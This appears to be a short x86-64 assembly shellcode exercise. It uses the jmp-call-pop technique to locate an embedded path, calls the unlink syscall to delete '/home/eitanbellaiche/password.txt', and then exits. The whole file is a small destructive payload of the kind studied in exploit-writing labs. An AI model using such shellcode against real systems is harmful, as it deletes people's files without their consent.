#include <sys/syscall.h>

#define FILEPATH "/home/eitanbellaiche/password.txt"

.globl main
    .type main, @function

main:
    jmp calladdr

popladdr:
    popq %rdi                 /* %rdi = pointer to filename */
    xorq %rax, %rax
    movb $SYS_unlink, %al     /* syscall number for unlink = 87 */
    syscall                   /* invoke syscall */

    /* exit(0) */
    xorq %rax, %rax
    movb $SYS_exit, %al
    xorq %rdi, %rdi
    syscall

calladdr:
    call popladdr
    .ascii FILEPATH
